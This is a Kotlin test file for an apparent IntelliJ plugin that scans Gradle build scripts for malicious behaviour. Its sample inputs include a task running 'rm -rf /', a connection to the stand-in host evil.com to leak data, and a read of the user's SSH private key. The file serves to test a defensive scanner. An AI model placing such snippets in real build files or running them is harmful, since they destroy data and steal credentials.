package com.github.safegradle.security

import com.intellij.testFramework.fixtures.BasePlatformTestCase
import org.junit.Test

class SecurityScannerTest : BasePlatformTestCase() {

    fun `test shell execution detection`() {
        val check = ShellExecutionCheck()
        val maliciousCode = """
            task hack {
                doLast {
                    Runtime.getRuntime().exec("rm -rf /")
                }
            }
        """.trimIndent()
        
        // We can't easily mock VirtualFile in unit tests without a real project structure in BasePlatformTestCase
        // So we will test the logic directly if possible, or use the scanner with the test project.
        
        val file = myFixture.configureByText("build.gradle", maliciousCode)
        val violations = check.check(file.virtualFile, maliciousCode)
        
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
        assertTrue(violations[0].message.contains("Runtime.getRuntime().exec"))
    }

    fun `test network activity detection`() {
        val check = NetworkActivityCheck()
        val maliciousCode = """
            val url = new java.net.URL("http://evil.com/leak")
            url.openConnection()
        """.trimIndent()
        
        val file = myFixture.configureByText("build.gradle.kts", maliciousCode)
        val violations = check.check(file.virtualFile, maliciousCode)
        
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test sensitive file detection`() {
        val check = SensitiveFileCheck()
        val maliciousCode = """
             val sshParams = File(System.getProperty("user.home") + "/.ssh/id_rsa")
        """.trimIndent()
        
        val file = myFixture.configureByText("settings.gradle", maliciousCode)
        val violations = check.check(file.virtualFile, maliciousCode)
        
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
        assertTrue(violations[0].message.contains("user.home"))
    }
}
